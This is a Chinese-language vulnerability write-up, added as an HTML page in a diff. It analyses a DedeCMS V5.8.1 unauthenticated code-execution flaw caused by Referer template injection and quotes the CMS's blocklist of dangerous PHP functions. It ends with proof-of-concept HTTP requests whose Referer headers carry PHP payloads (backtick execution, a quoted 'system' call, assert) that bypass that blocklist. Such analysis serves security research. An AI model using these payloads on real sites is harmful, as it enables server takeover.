@@ -1,0 +1,126 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="5bcb618162666fd9d20baccafb0926af">楔子</h1>
+<p>晚上在Srcincite上面看到了国外发布的DedeCMS_V5.8.1前台任意未授权命令执行，一时兴起就下下来分析了一波，自己也比较菜，有些点可能都说的不是很明白，其实这洞蛮简单的，有点类似于以前那个dz的前台代码执行，在写入临时tpl缓存文件的时候，缓存内容中存在可控的函数且使用了include进行包含，导致我们可以写入任意代码，造成代码执行，话不多说直接进入正题，漏洞主要是由于include\common.func.php中定义的ShowMsg参数导致的，任何文件存在调用ShowMsg的情况下，都可以造成模板注入，下面以Plus/recommend.php为例展开分析：</p>
+<p>Plus/recommend.php<br/>
+先看到recommend.php，<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002222047-efcf7948-238b-1.png"/><br/>
+贴出关键代码：</p>
+<div class="highlight"><pre><span></span><span class="x">require_once dirname(__FILE__) . "/../include/common.inc.php";//全局常用函数require_once DEDEINC . '/common.func.php';</span>
+<span class="x">if (empty($aid)) {</span>
+<span class="x">    ShowMsg("文档ID不能为空!", "-1");</span>
+<span class="x">    exit();</span>
+<span class="x">}</span>
+</pre></div>
+<p>include/common.func.php<br/>
+接着进入到common.func.php<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002222239-32e5ba76-238c-1.png"/><br/>
+贴出关键代码：</p>
+<div class="highlight"><pre><span></span><span class="x">if ($gourl == -1) {</span>
+<span class="x">        $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';</span>
+<span class="x">        if ($gourl == "") {</span>
+<span class="x">            $gourl = -1;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    ......</span>
+<span class="x">    function JumpUrl(){</span>
+<span class="x">        if(pgo==0){ location='$gourl'; pgo=1; }//$gourl的获取方式为$_SERVER['HTTP_REFERER']可控</span>
+
+<span class="x">    $msg = $htmlhead . $rmsg . $htmlfoot;</span>
+<span class="x">    $tpl = new DedeTemplate();</span>
+<span class="x">    $tpl-&gt;LoadString($msg);//dedetemplate.class.php</span>
+<span class="x">    $tpl-&gt;Display();</span>
+</pre></div>
+<p>以上就是临时构造的模板内容，且$gourl可控，在Plus/recommend.php中给gourl定义默认为-1//ShowMsg("文档ID不能为空!", "-1");，所以$gourl的值为REFERER，接着看处理模板的地方。</p>
+<p>include/dedetemplate.class.php<br/>
+在dedetemplate.class.php中，跟进到LoadString函数</p>
+<div class="highlight"><pre><span></span><span class="x">public function LoadString($str = '')</span>
+<span class="x">    {</span>
+<span class="x">        $this-&gt;sourceString = $str;</span>
+<span class="x">        $hashcode = md5($this-&gt;sourceString);</span>
+<span class="x">        $this-&gt;cacheFile = $this-&gt;cacheDir . "/string_" . $hashcode . ".inc";//生成的缓存文件名</span>
+<span class="x">        $this-&gt;configFile = $this-&gt;cacheDir . "/string_" . $hashcode . "_config.inc";</span>
+<span class="x">        $this-&gt;ParseTemplate();</span>
+<span class="x">    }</span>
+</pre></div>
+<p>Display函数</p>
+<div class="highlight"><pre><span></span><span class="x">public function Display()</span>
+<span class="x">    {</span>
+<span class="x">        global $gtmpfile;</span>
+<span class="x">        extract($GLOBALS, EXTR_SKIP);</span>
+<span class="x">        $this-&gt;WriteCache();</span>
+<span class="x">        include $this-&gt;cacheFile;</span>
+<span class="x">    }</span>
+</pre></div>
+<p>我们前面gourl注入的恶意代码，通过调用WriteCache写入</p>
+<div class="highlight"><pre><span></span><span class="x">public function WriteCache($ctype = 'all')</span>
+<span class="x">    {</span>
+<span class="x">        if (!file_exists($this-&gt;cacheFile) || $this-&gt;isCache == false</span>
+<span class="x">            || (file_exists($this-&gt;templateFile) &amp;&amp; (filemtime($this-&gt;templateFile) &gt; filemtime($this-&gt;cacheFile)))</span>
+<span class="x">        ) {</span>
+<span class="x">            if (!$this-&gt;isParse) {</span>
+<span class="x">                $this-&gt;ParseTemplate();</span>
+<span class="x">            }</span>
+<span class="x">            $fp = fopen($this-&gt;cacheFile, 'w') or dir("Write Cache File Error! ");</span>
+<span class="x">            flock($fp, 3);</span>
+<span class="x">            $result = trim($this-&gt;GetResult());</span>
+<span class="x">            $errmsg = '';</span>
+<span class="x">            if (!$this-&gt;CheckDisabledFunctions($result, $errmsg)) {</span>
+<span class="x">                fclose($fp);</span>
+<span class="x">                @unlink($this-&gt;cacheFile);</span>
+<span class="x">                die($errmsg);</span>
+<span class="x">            }</span>
+<span class="x">            fwrite($fp, $result);</span>
+<span class="x">            fclose($fp);</span>
+<span class="x">            if (count($this-&gt;tpCfgs) &gt; 0) {</span>
+<span class="x">                $fp = fopen($this-&gt;configFile, 'w') or dir("Write Config File Error! ");</span>
+<span class="x">                flock($fp, 3);</span>
+<span class="x">                fwrite($fp, '&lt;' . '?php' . "\r\n");</span>
+<span class="x">                foreach ($this-&gt;tpCfgs as $k =&gt; $v) {</span>
+<span class="x">                    $v = str_replace("\"", "\\\"", $v);</span>
+<span class="x">                    $v = str_replace("\$", "\\\$", $v);</span>
+<span class="x">                    fwrite($fp, "\$this-&gt;tpCfgs['$k']=\"$v\";\r\n");</span>
+<span class="x">                }</span>
+<span class="x">                fwrite($fp, '?' . '&gt;');</span>
+<span class="x">                fclose($fp);</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+</pre></div>
+<p>我们可以先看一下赋值Referer为coldwater，然后写入的模板内容。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002230306-d94e9aa4-2391-1.png"/><br/>
+现在我们将Referer替换为注入代码，当然我们如果直接写一些常见的危险函数是不行的，因为在dedetemplate.class.php中，存在CheckDisabledFunctions函数，CheckDisabledFunctions函数在WriteCache中被调用，会对内容进行一个检测。</p>
+<div class="highlight"><pre><span></span><span class="x">public function CheckDisabledFunctions($str, &amp;$errmsg = '')</span>
+<span class="x">    {</span>
+<span class="x">        global $cfg_disable_funs;</span>
+<span class="x">        $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite';</span>
+<span class="x">        // 模板引擎增加disable_functions</span>
+<span class="x">        if (!defined('DEDEDISFUN')) {</span>
+<span class="x">            $tokens = token_get_all_nl($str);</span>
+<span class="x">            $disabled_functions = explode(',', $cfg_disable_funs);</span>
+<span class="x">            foreach ($tokens as $token) {</span>
+<span class="x">                if (is_array($token)) {</span>
+<span class="x">                    if ($token[0] = '306' &amp;&amp; in_array($token[1], $disabled_functions)) {</span>
+<span class="x">                        $errmsg = 'DedeCMS Error:function disabled "' . $token[1] . '" &lt;a href="http://help.dedecms.com/install-use/apply/2013/0711/2324.html" target="_blank"&gt;more...&lt;/a&gt;';</span>
+<span class="x">                        return false;</span>
+<span class="x">                    }</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">        return true;</span>
+<span class="x">    }</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002230518-282be28a-2392-1.png"/><br/>
+但是很明显，assert不在这个黑名单里面，且对get和post请求中的字符没有过，滤我们可以利用assert或者call_user_func执行任意代码.<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002232317-ab07d234-2394-1.png"/><br/>
+除此之外，也并没有对""进行检测，在php中，""中的字符串可以被解析为函数，此外对反应号也没有检测，贴出实例。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002234701-fba993fa-2397-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211002235236-c3af946c-2398-1.png"/><br/>
+POC：</p>
+<pre><code>GET /plus/recommend.php?b=dir  HTTP/1.1
+Host: 127.0.0.1
+Referer: &lt;?php $b = `$a`;  echo "&lt;pre&gt;$b&lt;/pre&gt;";/*
+Referer: &lt;?php "system" ($b); /*
+Referer: &lt;?php  assert  ($b); /*</code></pre>
+<p>原文地址：<a href="https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html" target="_blank">https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html</a></p>
+</div>
+</div>
